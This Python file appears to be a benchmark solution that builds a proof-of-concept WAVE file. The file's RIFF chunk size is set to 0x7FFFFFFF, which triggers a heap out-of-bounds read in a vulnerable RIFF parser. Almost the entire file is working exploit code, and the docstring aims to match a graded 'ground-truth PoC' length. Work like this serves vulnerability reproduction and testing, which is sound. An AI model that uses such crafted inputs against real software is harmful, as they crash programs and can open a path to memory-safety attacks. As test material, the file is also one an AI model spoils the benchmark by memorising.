import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is a heap buffer overflow due to an out-of-bounds read
        when parsing a RIFF file. The description "data size is not properly
        checked against the end of the RIFF chunk" points to a vulnerability
        where a size field in the file is incorrect, causing the parser to read
        past the end of the buffer containing the file data.

        The most common variant of this vulnerability in RIFF parsers is a corrupted
        main RIFF chunk size. A parser that trusts this size field will continue
        to look for sub-chunks beyond the actual end of the file.

        This PoC constructs a 58-byte WAVE file that exploits this flaw:
        1.  It starts with a standard 'RIFF' header.
        2.  The RIFF chunk size, which should normally be (file_size - 8), is set
            to a very large value (0x7FFFFFFF).
        3.  It includes a valid 'fmt ' chunk, which is often a prerequisite for
            the parser to proceed, making the file appear valid enough to be processed.
        4.  A 'data' chunk follows, occupying the remaining bytes to meet the
            58-byte total length.

        A vulnerable parser will process the 'fmt ' and 'data' chunks successfully.
        Then, guided by the malicious RIFF chunk size, it will attempt to read the
        header for a subsequent chunk at an offset that lies outside the bounds
        of the allocated buffer, causing a crash.

        This construction perfectly matches the ground-truth PoC length of 58 bytes.
        """

        # 'RIFF' header: 4-byte ID, 4-byte size, 4-byte format ID.
        poc = b'RIFF'
        
        # Set the RIFF chunk size to a large value to cause an out-of-bounds read.
        # Any value larger than the actual data size (50) would work. 0x7FFFFFFF
        # is a common choice for such exploits.
        riff_chunk_size = 0x7FFFFFFF
        poc += struct.pack('<I', riff_chunk_size)
        
        poc += b'WAVE'

        # 'fmt ' sub-chunk: 4-byte ID, 4-byte size, 16-byte data. Total 24 bytes.
        poc += b'fmt '
        fmt_chunk_size = 16
        poc += struct.pack('<I', fmt_chunk_size)

        # A standard 16-byte PCM format specification.
        wFormatTag = 1      # PCM
        nChannels = 1       # Mono
        nSamplesPerSec = 8000
        nAvgBytesPerSec = 8000
        nBlockAlign = 1
        wBitsPerSample = 8
        fmt_data = struct.pack(
            '<HHIIHH',
            wFormatTag,
            nChannels,
            nSamplesPerSec,
            nAvgBytesPerSec,
            nBlockAlign,
            wBitsPerSample
        )
        poc += fmt_data

        # 'data' sub-chunk: Fills the remaining file to reach 58 bytes.
        # Current size = 12 (RIFF hdr) + 24 ('fmt ' chunk) = 36 bytes.
        # Remaining for 'data' chunk = 58 - 36 = 22 bytes.
        # 'data' chunk consists of 8-byte header and 14-byte data.
        poc += b'data'
        data_chunk_size = 14
        poc += struct.pack('<I', data_chunk_size)
        poc += b'\x00' * data_chunk_size
        
        return poc